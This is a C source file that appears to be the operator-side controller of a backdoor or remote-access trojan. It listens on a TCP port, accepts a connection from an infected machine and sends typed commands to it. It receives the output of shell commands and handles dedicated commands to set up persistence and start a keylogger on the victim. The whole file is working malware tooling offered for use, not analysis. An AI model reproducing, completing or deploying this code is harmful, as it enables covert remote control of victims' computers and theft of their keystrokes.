#include "libs/common.h"
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


//============== For Linux Servers ===============//
int main() {
	int sock, clientSocket;
	char buffer[1024];
	char response[18384];
	struct sockaddr_in serverAddress, clientAddress;
	int i = 0, optVal = 1;
	socklen_t clientLength;

	sock = socket(AF_INET, SOCK_STREAM, 0);

	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optVal, sizeof(optVal)) < 0) {
		printf("\nError: Setting TCP Socket Options ;(\n");
		return 1;
	}


	serverAddress.sin_family = AF_INET;
	serverAddress.sin_addr.s_addr = inet_addr(SERVER_IP);
	serverAddress.sin_port = htons(SERVER_PORT);

	bind(sock, (struct sockaddr *)&serverAddress, sizeof(serverAddress));
	listen(sock, CONN_AMNT);
	clientLength = sizeof(clientAddress);
	clientSocket = accept(sock, (struct sockaddr *)&clientAddress, &clientLength);

	while (TRUE) {
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printf("\n[%s]>", inet_ntoa(clientAddress.sin_addr));
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n");
		write(clientSocket, buffer, sizeof(buffer));

		// quit - quit connection
		if (strncmp("quit", buffer, 4) == 0) {
			break;
			// WSACleanup();
		}
		// cd
		else if (strncmp("cd ", buffer, 3) == 0) {
			recv(clientSocket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}
		// persist
		else if (strncmp("persist", buffer, 7) == 0) {
			recv(clientSocket, response, sizeof(response), 0);
			printf("%s", response);
		}
		// keylogger
		else if (strncmp("start keylogger", buffer, 15) == 0) {
			printf("Started Keylogger");
		}
		// default
		else {
			recv(clientSocket, response, sizeof(response), MSG_WAITALL);
			printf("%s", response);
		}
	}
}
